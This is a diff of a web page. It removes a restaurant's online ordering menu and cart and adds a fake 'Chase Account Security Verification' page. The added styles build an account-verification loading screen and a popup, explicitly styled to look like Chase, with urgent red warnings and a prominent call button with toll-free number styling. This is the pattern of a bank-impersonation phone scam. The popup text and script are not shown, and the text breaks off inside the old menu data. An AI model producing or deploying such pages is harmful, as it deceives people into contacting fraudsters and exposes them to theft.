@@ -1,401 +1,501 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>K's Tawa - Online Ordering</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Chase Account Security Verification</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
   <style>
-    :root { --primary-color: #d35400; --accent-color: #ff9800; --green-color: #27ae60; --red-color: #e74c3c; --background-color: #f8f9fa; --text-color: #333; --veg-color: #27ae60; --nonveg-color: #c0392b;}
-    html { scroll-behavior: smooth; }
-    body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif; margin: 0; background: var(--background-color); color: var(--text-color); padding-top: 155px; padding-bottom: 150px; }
-    @keyframes slideUp { from { transform: translateY(100%); } to { transform: translateY(0); } }
-    @keyframes flash-phone { 0%, 100% { color: white; transform: scale(1); } 50% { color: #ffeb3b; transform: scale(1.05); } }
-    @keyframes flashy-deal { 0%, 100% { transform: scale(1); box-shadow: 0 0 5px #ffeb3b; color: white; } 50% { transform: scale(1.03); box-shadow: 0 0 20px #ffeb3b, 0 0 30px #ffeb3b; color: #ffeb3b; } }
-    header { background: var(--primary-color); color: white; text-align: center; position: fixed; top: 0; width: 100%; box-sizing: border-box; z-index: 1000; padding: 10px 15px; box-shadow: 0 2px 8px rgba(0,0,0,0.2); }
-    .header-content { display: flex; justify-content: center; align-items: center; }
-    .header-logo { max-height: 50px; width: auto; flex-shrink: 0; }
-    .header-text { margin-left: 15px; text-align: left;}
-    .header-text h1 { margin: 0; font-size: 1.2em; color: white; }
-    .restaurant-info { font-size: 0.9em; font-weight: bold; line-height: 1.4; margin-top: 8px; color: white; }
-    .restaurant-info span { display: block; }
-    .restaurant-info a { color: white; text-decoration: none; display: inline-block; animation: flash-phone 2.5s infinite; }
-    .category-nav { background: white; position: fixed; top: 95px; width: 100%; box-shadow: 0 2px 5px rgba(0,0,0,0.1); white-space: nowrap; overflow-x: auto; -webkit-overflow-scrolling: touch; z-index: 999; border-bottom: 1px solid #eee; }
-    .category-nav a { display: inline-block; padding: 15px; color: var(--text-color); text-decoration: none; font-weight: 600; font-size: 0.9em; border-bottom: 3px solid transparent; transition: all 0.2s; }
-    .category-nav a.active, .category-nav a:hover { border-bottom-color: var(--primary-color); color: var(--primary-color); }
-    .menu-container { padding: 75px 15px 15px; }
-    section { padding-top: 20px; }
-    .main-category-title { font-size: 1.8em; color: var(--text-color); border-bottom: 4px solid var(--primary-color); padding-bottom: 10px; margin-bottom: 25px; }
-    .sub-category-title { font-size: 1.4em; padding: 10px 0; margin-top: 30px; margin-bottom: 15px; }
-    .item-card { display: flex; background: white; padding: 15px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.08); margin-bottom: 20px; align-items: flex-start; }
-    .item-details { flex-grow: 1; display: flex; flex-direction: column; }
-    .item-veg-indicator { width: 12px; height: 12px; border-radius: 2px; display: inline-block; margin-right: 8px; border: 1.5px solid; }
-    .veg { border-color: var(--veg-color); background-color: var(--veg-color); }
-    .non-veg { border-color: var(--nonveg-color); background-color: var(--nonveg-color); }
-    .item-name { font-weight: 600; font-size: 1.1em; color: var(--text-color); }
-    .item-price { font-size: 1em; color: #666; margin-top: 8px; }
-    .item-image-cta-wrapper { display: flex; flex-direction: column; align-items: center; margin-left: 15px; flex-shrink: 0; }
-    .item-image { width: 120px; height: 120px; object-fit: cover; border-radius: 8px; }
-    .item-cta { margin-top: 10px; width: 100%; }
-    .add-btn { background: #fff; color: var(--green-color); border: 2px solid var(--green-color); padding: 8px 25px; border-radius: 8px; font-weight: bold; cursor: pointer; width: 100%; box-sizing: border-box;}
-    .quantity-control { display: flex; align-items: center; justify-content: space-between; border: 2px solid var(--green-color); border-radius: 8px; width: 100px; margin: 0 auto;}
-    .quantity-control button { background: none; border: none; color: var(--green-color); font-size: 1.5em; font-weight: bold; cursor: pointer; padding: 5px 12px; }
-    footer { position: fixed; bottom: 0; width: 100%; background: white; padding: 10px; box-shadow: 0 -2px 10px rgba(0,0,0,0.1); text-align: center;}
-    .deal-banner { background-color: var(--red-color); color: white; padding: 12px; font-size: 1.1em; font-weight: bold; text-align: center; margin: 0 auto 10px auto; border-radius: 8px; width: 95%; max-width: 450px; animation: flashy-deal 2s infinite; box-sizing: border-box; line-height: 1.4; }
-    .footer-cart-btn { display: none; width: 95%; max-width: 450px; margin: 0 auto; padding: 16px; font-size: 1.2em; color: white; border: none; border-radius: 10px; cursor: pointer; font-weight: bold; background-color: var(--green-color); }
-    #optionsModal, #checkoutModal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 1001; background: rgba(0,0,0,0.6); align-items: center; justify-content: center; }
-    .modal-dialog { position: absolute; bottom: 0; left: 0; width: 100%; background: #fff; border-radius: 20px 20px 0 0; box-sizing: border-box; max-height: 85vh; display: flex; flex-direction: column; animation: slideUp 0.3s ease-out; }
-    .modal-header { padding: 15px 20px; border-bottom: 1px solid #eee; } .modal-header h2 { margin: 0; font-size: 1.4em; }
-    .modal-body { padding: 10px 20px; overflow-y: auto; }
-    .option-group h3 { font-size: 1.1em; margin: 20px 0 10px; } .option-choice { display: flex; justify-content: space-between; align-items: center; padding: 12px 0; }
-    .modal-footer { padding: 15px 20px; border-top: 1px solid #eee; } .modal-add-btn { width: 100%; padding: 16px; font-size: 1.1em; font-weight: bold; color: white; background: var(--green-color); border: none; border-radius: 10px; cursor: pointer; }
-    .checkout-modal-content { background: white; padding: 25px; border-radius: 12px; width: 90%; max-width: 400px; }
-    .checkout-modal-content h2 { margin-top: 0; }
-    .checkout-modal-content ul { list-style-type: none; padding: 10px 0; max-height: 150px; overflow-y: auto; }
-    .price-summary { border-top: 1px solid #eee; margin-top: 15px; padding-top: 15px; }
-    .price-line.total { font-weight: bold; font-size: 1.2em; }
-    .checkout-modal-content input[type="text"], .checkout-modal-content input[type="tel"] { width: 100%; box-sizing: border-box; margin-bottom: 15px; padding: 14px; border: 1px solid #ccc; border-radius: 8px; font-size: 1.1em;}
-    .place-order-btn { background-color: var(--green-color); width: 100%; padding: 14px; border: none; border-radius: 8px; font-size: 1.1em; font-weight: bold; color: white; }
-    .order-type-selector { margin-bottom: 20px; padding: 10px; border: 1px solid #ccc; border-radius: 8px; }
-    .order-type-selector legend { font-weight: bold; padding: 0 5px; margin-left: 10px; }
-    .order-type-options { display: flex; justify-content: space-around; padding-top: 10px; }
-    .order-type-options label { font-size: 1.1em; }
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+    }
+    
+    body {
+      background: linear-gradient(135deg, #1a3a1f 0%, #2c5c2f 100%);
+      color: #333;
+      min-height: 100vh;
+      position: relative;
+      overflow: hidden;
+    }
+    
+    .loading-screen {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0, 0, 0, 0.95);
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      z-index: 2000;
+      color: white;
+      padding: 20px;
+      text-align: center;
+    }
+    
+    .loader {
+      width: 60px;
+      height: 60px;
+      border: 6px solid rgba(255, 255, 255, 0.3);
+      border-radius: 50%;
+      border-top: 6px solid #28a745;
+      animation: spin 1.5s linear infinite;
+      margin-bottom: 20px;
+    }
+    
+    .loading-text {
+      font-size: 22px;
+      margin-bottom: 10px;
+      font-weight: 500;
+    }
+    
+    .loading-text span {
+      color: #28a745;
+      font-weight: bold;
+    }
+    
+    .loading-subtext {
+      font-size: 16px;
+      opacity: 0.8;
+      margin-bottom: 30px;
+      max-width: 400px;
+      line-height: 1.5;
+    }
+    
+    .progress-bar {
+      width: 100%;
+      max-width: 300px;
+      height: 8px;
+      background: #444;
+      border-radius: 4px;
+      margin-top: 20px;
+      overflow: hidden;
+    }
+    
+    .progress {
+      height: 100%;
+      width: 0%;
+      background: #28a745;
+      animation: progress 5s linear;
+    }
+    
+    /* Popup styles - Enhanced to look like Chase */
+    #security-popup {
+      display: none;
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100vw;
+      height: 100vh;
+      background: rgba(0, 0, 0, 0.98);
+      z-index: 3000;
+      justify-content: center;
+      align-items: center;
+      animation: fadeIn 0.5s ease;
+      flex-direction: column;
+      color: #2d3748;
+      padding: 20px;
+      box-sizing: border-box;
+    }
+    
+    #security-popup .chase-header {
+      background: #117c45;
+      padding: 20px;
+      text-align: center;
+      width: 100%;
+      max-width: 600px;
+      border-top-left-radius: 12px;
+      border-top-right-radius: 12px;
+      box-sizing: border-box;
+    }
+    
+    .chase-logo {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      margin-bottom: 10px;
+    }
+    
+    .logo-square {
+      width: 40px;
+      height: 40px;
+      background: white;
+      border-radius: 8px;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      margin-right: 10px;
+    }
+    
+    .logo-text {
+      color: white;
+      font-size: 24px;
+      font-weight: 700;
+      letter-spacing: 0.5px;
+    }
+    
+    #security-popup .chase-header h2 {
+      color: white;
+      font-size: 18px;
+      font-weight: 500;
+    }
+    
+    #security-popup .content {
+      background: white;
+      padding: 25px;
+      max-width: 600px;
+      width: 100%;
+      border-bottom-left-radius: 12px;
+      border-bottom-right-radius: 12px;
+      text-align: center;
+      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
+      animation: scaleIn 0.5s ease;
+      box-sizing: border-box;
+    }
+    
+    #security-popup .alert-icon {
+      font-size: 50px;
+      margin: 20px 0;
+      color: #d83b3b;
+    }
+    
+    #security-popup .urgent-text {
+      color: #d83b3b;
+      font-weight: bold;
+      font-size: 22px;
+      margin: 20px 0;
+      text-transform: uppercase;
+      line-height: 1.4;
+    }
+    
+    #security-popup p {
+      margin: 15px 0;
+      line-height: 1.6;
+      font-size: 16px;
+      color: #2d3748;
+    }
+    
+    .alert-details {
+      background: #fef7f7;
+      border-left: 4px solid #d83b3b;
+      padding: 15px;
+      border-radius: 6px;
+      margin: 20px 0;
+      text-align: left;
+    }
+    
+    .alert-details p {
+      margin: 8px 0;
+      color: #2d3748;
+      font-size: 15px;
+    }
+    
+    .call-container {
+      background: #f8f9fa;
+      border-radius: 10px;
+      padding: 20px;
+      margin: 25px 0;
+      border: 2px solid #117c45;
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+    }
+    
+    .call-title {
+      font-size: 20px;
+      color: #117c45;
+      margin-bottom: 15px;
+      font-weight: 600;
+    }
+    
+    #popup-call-btn {
+      display: inline-block;
+      padding: 16px 30px;
+      background: #117c45;
+      color: white;
+      text-decoration: none;
+      border-radius: 8px;
+      font-size: 18px;
+      font-weight: bold;
+      box-shadow: 0 4px 12px rgba(17, 124, 69, 0.3);
+      transition: all 0.3s ease;
+      border: none;
+      cursor: pointer;
+      width: 100%;
+      max-width: 350px;
+    }
+    
+    #popup-call-btn:hover {
+      background: #0c5e34;
+      transform: translateY(-2px);
+      box-shadow: 0 6px 15px rgba(17, 124, 69, 0.4);
+    }
+    
+    .toll-free {
+      margin-top: 15px;
+      font-size: 16px;
+      color: #117c45;
+      font-weight: 600;
+    }
+    
+    .contact-info {
+      margin-top: 20px;
+      font-size: 14px;
+      color: #718096;
+    }
+    
+    .security-tips {
+      background: #f7f9fc;
+      border-radius: 8px;
+      padding: 15px;
+      margin-top: 20px;
+      text-align: left;
+    }
+    
+    .security-tips h3 {
+      color: #2d3748;
+      font-size: 14px;
+      font-weight: 600;
+      margin-bottom: 10px;
+      display: flex;
+      align-items: center;
+    }
+    
+    .security-tips h3 i {
+      color: #117c45;
+      margin-right: 8px;
+    }
+    
+    .security-tips ul {
+      padding-left: 20px;
+      color: #4a5568;
+      font-size: 13px;
+    }
+    
+    .security-tips li {
+      margin-bottom: 8px;
+    }
+    
+    @keyframes fadeIn {
+      from { opacity: 0; }
+      to { opacity: 1; }
+    }
+    
+    @keyframes scaleIn {
+      from { transform: scale(0.9); opacity: 0; }
+      to { transform: scale(1); opacity: 1; }
+    }
+    
+    @keyframes pulse {
+      0% { transform: scale(1); }
+      50% { transform: scale(1.05); }
+      100% { transform: scale(1); }
+    }
+    
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+    
+    @keyframes progress {
+      0% { width: 0%; }
+      100% { width: 100%; }
+    }
+    
+    .pulse {
+      animation: pulse 2s infinite;
+    }
+    
+    /* Mobile-specific styles */
+    @media (max-width: 480px) {
+      .loading-text {
+        font-size: 20px;
+      }
+      
+      .loading-subtext {
+        font-size: 15px;
+      }
+      
+      .loader {
+        width: 50px;
+        height: 50px;
+      }
+      
+      #security-popup .chase-header {
+        padding: 15px;
+      }
+      
+      .logo-square {
+        width: 35px;
+        height: 35px;
+      }
+      
+      .logo-text {
+        font-size: 22px;
+      }
+      
+      #security-popup .chase-header h2 {
+        font-size: 16px;
+      }
+      
+      #security-popup .content {
+        padding: 20px 15px;
+      }
+      
+      #security-popup .urgent-text {
+        font-size: 19px;
+      }
+      
+      #security-popup p {
+        font-size: 15px;
+      }
+      
+      .call-container {
+        padding: 15px;
+      }
+      
+      .call-title {
+        font-size: 18px;
+      }
+      
+      #popup-call-btn {
+        font-size: 16px;
+        padding: 14px 20px;
+      }
+      
+      .toll-free {
+        font-size: 15px;
+      }
+      
+      .alert-details {
+        padding: 12px;
+      }
+      
+      .alert-details p {
+        font-size: 14px;
+      }
+    }
+
+    /* Tablet-specific styles */
+    @media (min-width: 481px) and (max-width: 768px) {
+      #security-popup .content {
+        padding: 25px 20px;
+      }
+      
+      #popup-call-btn {
+        font-size: 17px;
+        padding: 15px 25px;
+      }
+    }
+
+    /* Prevent zoom on input focus for mobile */
+    @media (max-width: 768px) {
+      input, select, textarea {
+        font-size: 16px !important;
+      }
+    }
   </style>
 </head>
 <body>
-<header>
-    <div class="header-content">
-        <img src="https://lh3.googleusercontent.com/tHEXO53lDMWp5DAV2aD9PprhZVZm7zDNvOaQnUEw4t5CwN70xPdj0BozneN1Sa4alO1vQaZ4fv4J9vEOhkz_E7di-uMRPRa5qaTnOPmoGQ=w256-rw" alt="K's Tawa Logo" class="header-logo">
-        <div class="header-text">
-            <h1>K’s Tawa V/s Tandoor Junction</h1>
-            <div class="restaurant-info">
-                <span>C-920 Ratan Plaza, Ramphal Chowk, Dwarka Sector - 7</span>
-                <a href="tel:7678654713">Phone: 7678654713</a>
-            </div>
-        </div>
-    </div>
-</header>
-<nav class="category-nav" id="category-nav"></nav>
-<div class="menu-container" id="menu-container"></div>
 
-<footer>
-    <div class="deal-banner">
-        ALL MAGICPIN COUPONS HAVE BEEN DEACTIVATED<br>GET STRAIGHT FLAT 20% DISCOUNT FROM US!
+  <div class="loading-screen">
+    <div class="loader"></div>
+    <div class="loading-text">Verifying your account security<span>...</span></div>
+    <div class="loading-subtext">Please wait while we analyze your account activity</div>
+    <div class="progress-bar">
+      <div class="progress"></div>
     </div>
-    <button id="footerCartBtn" class="footer-cart-btn" onclick="showCheckoutForm()">View Cart</button>
-</footer>
-
-<div id="checkoutModal">
-  <div class="checkout-modal-content">
-    <h2>Enter Order Details</h2>
-    <input type="text" id="customerName" placeholder="Full Name" required />
-    <input type="tel" id="customerPhone" placeholder="Phone Number" required />
-    
-    <fieldset class="order-type-selector">
-        <legend>Order Type</legend>
-        <div class="order-type-options">
-            <label><input type="radio" name="orderType" value="Takeaway" checked> Takeaway</label>
-            <label><input type="radio" name="orderType" value="Dine-in"> Dine-in</label>
-        </div>
-    </fieldset>
-    
-    <h4>Order Summary:</h4>
-    <ul id="cartItemsList"></ul>
-    <div class="price-summary">
-        <hr>
-        <div class="price-line total">
-            <span>Total To Pay</span><span id="checkoutTotal">₹0.00</span>
-        </div>
-    </div>
-    <div><button onclick="submitOrder()" id="submitBtn" class="place-order-btn">Place Order</button></div>
   </div>
-</div>
 
-<div id="optionsModal">
-  <div class="modal-dialog">
-    <div class="modal-header"><h2 id="modalItemName"></h2></div>
-    <div class="modal-body" id="modalBody"></div>
-    <div class="modal-footer"><button id="modalAddItemBtn" class="modal-add-btn">Add item - ₹0</button></div>
-  </div>
-</div>
-
-<script>
-    const menuData = {"cat-starters":{title:"Chef's Specials Tandoori Starters",subCategories:{"veg-starters":{title:"🔥 Tandoori Starters (Veg)",items:[{id:"achari-chaap",name:"Achari Chaap",price:110,isVeg:!0,image:"https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRnOQ3dq-ZmXSnjRbvKNBzckbr8HOF7SEAhdA&s?q=80&w=800&auto=format&fit=crop",options:[{group:"Size",type:"radio",required:!0,choices:[{name:"Half",price:110},{name:"Full",price:180}]}]},{id:"lemon-chaap",name:"Lemon Chaap",price:110,isVeg:!0,image:"https://shoopy.b-cdn.net/273385/1704634679406_SKU-2916_0.jpg?format=webp?q=80&w=800&auto=format&fit=crop",options:[{group:"Size",type:"radio",required:!0,choices:[{name:"Half",price:110},{name:"Full",price:180}]}]},{id:"chatpati-chaap",name:"Chatpati Chaap",price:110,isVeg:!0,image:"https://media-assets.swiggy.com/swiggy/image/upload/fl_lossy,f_auto,q_auto/426cfdb867684e57e63f1e0cd784d174?q=80&w=800&auto=format&fit=crop",options:[{group:"Size",type:"radio",required:!0,choices:[{name:"Half",price:110},{name:"Full",price:180}]}]},{id:"malai-chaap",name:"Malai Chaap",price:110,isVeg:!0,image:"https://nishamadhulika.com/imgpst/featured/soya_chaap_white_gravy.jpg?q=80&w=800&auto=format&fit=crop",options:[{group:"Size",type:"radio",required:!0,choices:[{name:"Half",price:110},{name:"Full",price:180}]}]},{id:"paneer-tikka",name:"Paneer Tikka",price:120,isVeg:!0,image:"https://www.cookwithkushi.com/wp-content/uploads/2023/02/tandoori_paneer_tikka_restaurant_style.jpg?q=80&w=800&auto=format&fit=crop",options:[{group:"Size",type:"radio",required:!0,choices:[{name:"Half",price:120},{name:"Full",price:200}]}]},{id:"paneer-malai-tikka",name:"Paneer Malai Tikka",price:140,isVeg:!0,image:"https://i.ytimg.com/vi/Oy3YX7OTVqI/maxresdefault.jpg?q=80&w=800&auto=format&fit=crop",options:[{group:"Size",type:"radio",required:!0,choices:[{name:"Half",price:140},{name:"Full",price:240}]}]},{id:"paneer-achari-tikka",name:"Paneer Achari Tikka",price:120,isVeg:!0,image:"https://img-global.cpcdn.com/recipes/ac467aeb4ef8bc02/1200x630cq70/photo.jpg?q=80&w=800&auto=format&fit=crop",options:[{group:"Size",type:"radio",required:!0,choices:[{name:"Half",price:120},{name:"Full",price:200}]}]},{id:"peri-peri-soya-chaap",name:"Peri Peri Soya Chaap",price:110,isVeg:!0,image:"https://b.zmtcdn.com/data/dish_photos/2c3/63e6728d7ba3c1577efcbce416a2a2c3.jpg?q=80&w=800&auto=format&fit=crop",options:[{group:"Size",type:"radio",required:!0,choices:[{name:"Half",price:110},{name:"Full",price:180}]}]},{id:"peri-peri-paneer-tikka",name:"Peri Peri Paneer Tikka",price:120,isVeg:!0,image:"https://ministryofcurry.com/wp-content/uploads/2021/01/Paneer-Tikka_-2-1.jpg?q=80&w=800&auto=format&fit=crop",options:[{group:"Size",type:"radio",required:!0,choices:[{name:"Half",price:120},{name:"Full",price:200}]}]},{id:"afghani-tandoori-chaap",name:"Afghani Tandoori Chaap",price:140,isVeg:!0,image:"https://orders.popskitchen.in/storage/2024/09/image-362.png?q=80&w=800&auto=format&fit=crop",options:[{group:"Size",type:"radio",required:!0,choices:[{name:"Half",price:140},{name:"Full",price:220}]}]}]},"non-veg-starters":{title:"🔥 Tandoori Starters (Non-Veg)",items:[{id:"bhatti-murg",name:"Bhatti Murg",price:260,isVeg:!1,image:"https://skyviewbyempyrean.com/wp-content/uploads/2022/04/chefs-speciality-scaled.jpg?q=80&w=800&auto=format&fit=crop",options:[{group:"Size",type:"radio",required:!0,choices:[{name:"4 pcs",price:260},{name:"8 pcs",price:480}]}]},{id:"tandoori-chicken",name:"Tandoori Chicken",price:260,isVeg:!1,image:"https://static01.nyt.com/images/2024/05/16/multimedia/fs-tandoori-chicken-hmjq/fs-tandoori-chicken-hmjq-videoSixteenByNineJumbo1600.jpg?q=80&w=800&auto=format&fit=crop",options:[{group:"Size",type:"radio",required:!0,choices:[{name:"4 pcs",price:260},{name:"8 pcs",price:480}]}]}]}}},"cat-platters":{title:"Platters & Meal Combos",items:[{id:"tandoori-veg-platter",name:"Tandoori Veg Platters",price:350,isVeg:!0,image:"https://thesaffronhouse.ca/wp-content/uploads/2023/11/non-veg-platter-1.jpg?q=80&w=800&auto=format&fit=crop"},{id:"malai-peri-combo",name:"Malai Chaap (Half) + Peri Peri Soya Chaap (Half)",price:279,isVeg:!0,image:"https://images.unsplash.com/photo-1628209888795-a5089ac3e0f0?q=80&w=800&auto=format&fit=crop"},{id:"lemon-chatpati-combo",name:"Lemon Chaap (Half) + Chatpati Chaap (Half)",price:279,isVeg:!0,image:"https://images.unsplash.com/photo-1625944228741-cf3ab592b868?q=80&w=800&auto=format&fit=crop"},{id:"afghani-achari-combo",name:"Afghani Tandoori Chaap (Half) + Achari Chaap (Half)",price:279,isVeg:!0,image:"https://images.unsplash.com/photo-1628209888795-a5089ac3e0f0?q=80&w=800&auto=format&fit=crop"}]},"cat-rolls":{title:"Rocking Rolls",items:[{id:"malai-chaap-roll",name:"Malai Chaap Roll",price:120,isVeg:!0,image:"https://plus.unsplash.com/premium_photo-1695299444434-297d2b9326e7?q=80&w=800&auto=format&fit=crop",options:[{group:"Size",type:"radio",required:!0,choices:[{name:"Half",price:120},{name:"Full",price:190}]}]},{id:"chatpati-chaap-roll",name:"Chatpati Chaap Roll",price:120,isVeg:!0,image:"https://plus.unsplash.com/premium_photo-1695299444434-297d2b9326e7?q=80&w=800&auto=format&fit=crop",options:[{group:"Size",type:"radio",required:!0,choices:[{name:"Half",price:120},{name:"Full",price:190}]}]},{id:"achari-chaap-roll",name:"Achari Chaap Roll",price:120,isVeg:!0,image:"https://plus.unsplash.com/premium_photo-1695299444434-297d2b9326e7?q=80&w=800&auto=format&fit=crop",options:[{group:"Size",type:"radio",required:!0,choices:[{name:"Half",price:120},{name:"Full",price:190}]}]},{id:"afghani-chaap-roll",name:"Afghani Chaap Roll",price:130,isVeg:!0,image:"https://plus.unsplash.com/premium_photo-1695299444434-297d2b9326e7?q=80&w=800&auto=format&fit=crop",options:[{group:"Size",type:"radio",required:!0,choices:[{name:"Half",price:130},{name:"Full",price:220}]}]},{id:"lemon-chaap-roll",name:"Lemon Chaap Roll",price:120,isVeg:!0,image:"https://plus.unsplash.com/premium_photo-1695299444434-297d2b9326e7?q=80&w=800&auto=format&fit=crop",options:[{group:"Size",type:"radio",required:!0,choices:[{name:"Half",price:120},{name:"Full",price:190}]}]},{id:"paneer-tikka-roll",name:"Paneer Tikka Roll",price:120,isVeg:!0,image:"https://images.unsplash.com/photo-1615478503562-ec2d82e85b8a?q=80&w=800&auto=format&fit=crop",options:[{group:"Size",type:"radio",required:!0,choices:[{name:"Half",price:120},{name:"Full",price:200}]}]},{id:"peri-peri-soya-roll",name:"Peri Peri Soya Chaap Roll",price:120,isVeg:!0,image:"https://plus.unsplash.com/premium_photo-1695299444434-297d2b9326e7?q=80&w=800&auto=format&fit=crop",options:[{group:"Size",type:"radio",required:!0,choices:[{name:"Half",price:120},{name:"Full",price:190}]}]},{id:"peri-peri-paneer-roll",name:"Peri Peri Paneer Tikka Roll",price:140,isVeg:!0,image:"https://images.unsplash.com/photo-1615478503562-ec2d82e85b8a?q=80&w=800&auto=format&fit=crop",options:[{group:"Size",type:"radio",required:!0,choices:[{name:"Half",price:140},{name:"Full",price:200}]}]}]},"cat-main-course":{title:"Main Course",subCategories:{"veg-main":{title:"🥗 Veg Main Course",items:[{id:"tawa-chaap-masala",name:"Tawa Chaap Masala",price:160,isVeg:!0,image:"https://plus.unsplash.com/premium_photo-1668618296839-a782c57c61f0?q=80&w=800&auto=format&fit=crop",options:[{group:"Size",type:"radio",required:!0,choices:[{name:"Half",price:160},{name:"Full",price:230}]}]},{id:"tawa-paneer-masala",name:"Tawa Paneer Masala",price:160,isVeg:!0,image:"https://images.unsplash.com/photo-1668618224539-36c531a6a683?q=80&w=800&auto=format&fit=crop",options:[{group:"Size",type:"radio",required:!0,choices:[{name:"Half",price:160},{name:"Full",price:230}]}]},{id:"paneer-takatak",name:"Paneer Takatak",price:170,isVeg:!0,image:"https://plus.unsplash.com/premium_photo-1695299444434-297d2b9326e7?q=80&w=800&auto=format&fit=crop",options:[{group:"Size",type:"radio",required:!0,choices:[{name:"Half",price:170},{name:"Full",price:240}]}]},{id:"butter-chaap",name:"Butter Chaap",price:170,isVeg:!0,image:"https://plus.unsplash.com/premium_photo-1668618296839-a782c57c61f0?q=80&w=800&auto=format&fit=crop",options:[{group:"Size",type:"radio",required:!0,choices:[{name:"Half",price:170},{name:"Full",price:240}]}]},{id:"shahi-paneer",name:"Shahi Paneer",price:120,isVeg:!0,image:"https://images.unsplash.com/photo-1565557623262-b27e25248540?q=80&w=800&auto=format&fit=crop",options:[{group:"Size",type:"radio",required:!0,choices:[{name:"Half",price:120},{name:"Full",price:200}]}]},{id:"kadhai-chaap",name:"Kadhai Chaap",price:120,isVeg:!0,image:"https://plus.unsplash.com/premium_photo-1668618296839-a782c57c61f0?q=80&w=800&auto=format&fit=crop",options:[{group:"Size",type:"radio",required:!0,choices:[{name:"Half",price:120},{name:"Full",price:210}]}]},{id:"mix-veg",name:"Mix Veg",price:120,isVeg:!0,image:"https://images.unsplash.com/photo-1533089860892-a7c6f0a485d8?q=80&w=800&auto=format&fit=crop",options:[{group:"Size",type:"radio",required:!0,choices:[{name:"Half",price:120},{name:"Full",price:190}]}]},{id:"kadhai-paneer",name:"Kadhai Paneer",price:120,isVeg:!0,image:"https://images.unsplash.com/photo-1574484284002-952d92456975?q=80&w=800&auto=format&fit=crop",options:[{group:"Size",type:"radio",required:!0,choices:[{name:"Half",price:120},{name:"Full",price:200}]}]},{id:"paneer-butter-masala",name:"Paneer Butter Masala",price:140,isVeg:!0,image:"https://images.unsplash.com/photo-1589647363585-f4a7d38779df?q=80&w=800&auto=format&fit=crop",options:[{group:"Size",type:"radio",required:!0,choices:[{name:"Half",price:140},{name:"Full",price:230}]}]},{id:"matar-paneer",name:"Matar Paneer",price:130,isVeg:!0,image:"https://images.unsplash.com/photo-1563379926898-05f4575a45d8?q=80&w=800&auto=format&fit=crop",options:[{group:"Size",type:"radio",required:!0,choices:[{name:"Half",price:130},{name:"Full",price:220}]}]},{id:"paneer-lababdar",name:"Paneer Lababdar",price:160,isVeg:!0,image:"https://plus.unsplash.com/premium_photo-1695299444434-297d2b9326e7?q=80&w=800&auto=format&fit=crop",options:[{group:"Size",type:"radio",required:!0,choices:[{name:"Half",price:160},{name:"Full",price:250}]}]},{id:"tadka-dal-fry",name:"Tadka Dal Fry",price:120,isVeg:!0,image:"https://images.unsplash.com/photo-1609560140263-14a775a27814?q=80&w=800&auto=format&fit=crop",options:[{group:"Size",type:"radio",required:!0,choices:[{name:"Half",price:120},{name:"Full",price:180}]}]}]},"non-veg-main":{title:"🍗 Non-Veg Main Course",items:[{id:"butter-chicken",name:"Butter Chicken",price:220,isVeg:!1,image:"https://images.unsplash.com/photo-1588166524941-3bf61a9c41db?q=80&w=800&auto=format&fit=crop",options:[{group:"Size",type:"radio",required:!0,choices:[{name:"Qtr",price:220},{name:"Half",price:390},{name:"Full",price:650}]}]},{id:"chicken-do-pyaza",name:"Chicken Do Pyaza",price:390,isVeg:!1,image:"https://images.unsplash.com/photo-1604128699120-80213a1d9494?q=80&w=800&auto=format&fit=crop",options:[{group:"Size",type:"radio",required:!0,choices:[{name:"Half",price:390},{name:"Full",price:650}]}]},{id:"kadai-chicken",name:"Kadai Chicken",price:220,isVeg:!1,image:"https://images.unsplash.com/photo-1598515214211-89d3c7373058?q=80&w=800&auto=format&fit=crop",options:[{group:"Size",type:"radio",required:!0,choices:[{name:"Qtr",price:220},{name:"Half",price:390},{name:"Full",price:650}]}]},{id:"tawa-chicken",name:"Tawa Chicken",price:220,isVeg:!1,image:"https://images.unsplash.com/photo-1610057099443-fde8ce495cb5?q=80&w=800&auto=format&fit=crop",options:[{group:"Size",type:"radio",required:!0,choices:[{name:"Qtr",price:220},{name:"Half",price:420},{name:"Full",price:660}]}]},{id:"ghar-jaisa-chicken",name:"Ghar Jaisa Chicken Curry",price:220,isVeg:!1,image:"https://images.unsplash.com/photo-1574484284002-952d92456975?q=80&w=800&auto=format&fit=crop",options:[{group:"Size",type:"radio",required:!0,choices:[{name:"Qtr",price:220},{name:"Half",price:370},{name:"Full",price:630}]}]},{id:"chicken-rara-punjabi",name:"Chicken Rara Punjabi KS Special",price:220,isVeg:!1,image:"https://images.unsplash.com/photo-1598515214211-89d3c7373058?q=80&w=800&auto=format&fit=crop",options:[{group:"Size",type:"radio",required:!0,choices:[{name:"Qtr",price:220},{name:"Half",price:450},{name:"Full",price:700}]}]},{id:"boti-chicken-masala",name:"Boti Chicken Masala",price:390,isVeg:!1,image:"https://images.unsplash.com/photo-1626082933429-01c05c312c3a?q=80&w=800&auto=format&fit=crop",options:[{group:"Size",type:"radio",required:!0,choices:[{name:"Half",price:390},{name:"Full",price:650}]}]},{id:"chicken-tikka-butter-masala",name:"Chicken Tikka Butter 